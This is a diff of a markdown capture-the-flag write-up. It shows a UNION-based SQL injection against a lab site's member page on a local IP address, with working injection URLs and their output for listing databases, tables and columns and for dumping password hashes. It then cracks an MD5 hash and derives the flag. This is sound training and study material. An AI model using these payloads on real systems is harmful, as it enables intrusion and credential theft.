@@ -9,7 +9,7 @@ In the search field search '1 and 1 = 1' (which shows you that the form is vulne
 
 ## Manipulation
 
-getting current database name and listing all databases:
+### getting current database name and listing all databases
 
 ```
 
@@ -17,7 +17,7 @@ http://192.168.1.102/?page=member&id=42 union select database(), schema_name fro
 
 ```
 
-result:
+#### result
 
 ```
 
@@ -44,20 +44,29 @@ Surname : Member_survey
 
 which shows that the current database is Member_Sql_Injection, the other databases are Member_Brute_Force, Member_guestbook, Member_images, Member_survey
 
-getting a list of tables in current database:
+### getting a list of tables in current database
+
 http://192.168.1.102/?page=member&id=42 union select table_name, create_time from information_schema.tables where table_schema=database()&Submit=Submit
 
-result:
+#### result
+
+```
 ID: 42 union select table_name, create_time from information_schema.tables where table_schema=database()
 First name: users
 Surname : 2015-09-16 15:55:03
 
+```
+
 which shows that the database has a table called users
 
-listing all column names and types:
+### listing all column names and types
+
 http://192.168.1.102/?page=member&id=42 union select column_name, column_type from information_schema.columns where table_schema=database()&Submit=Submit
 
-result:
+#### result
+
+```
+
 ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
 First name: user_id
 Surname : int(11)
@@ -83,12 +92,18 @@ ID: 42 union select column_name, column_type from information_schema.columns whe
 First name: countersign
 Surname : varchar(255)
 
+```
+
 which shows that we have the columns user_id, first_name, last_name, town, country, planet, Commentaire, countersign
 
-getting the password information:
+### getting the password information
+
 http://192.168.1.102/?page=member&id=42 union select Commentaire, countersign from users&Submit=Submit
 
-result:
+#### result
+
+```
+
 ID: 42 union select Commentaire, countersign from users
 First name: Amerca !
 Surname : 2b3366bcfd44f540e630d4dc2b9b06d9
@@ -102,12 +117,14 @@ ID: 42 union select Commentaire, countersign from users
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
 
+```
+
 You can see that it gives us this helpful part that says Decrypt this password -> then lower all the char. Sh256 on it and it's good
 We then follow this instruction to get the flag we need.
 
 ## How to get the flag
 
-Decode the hash 5ff9d0165b4f92b14994e5c685cdce28 using the md5.gromweb.com website.
-Which gives us the original string "FortyTwo"
-lower all characters and as per the instructions Sh256 of fortytwo is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+Decode the hash 5ff9d0165b4f92b14994e5c685cdce28 using the md5.gromweb.com website.  
+Which gives us the original string "FortyTwo"  
+lower all characters and as per the instructions Sh256 of fortytwo is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  
 We now have the flag (10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5)
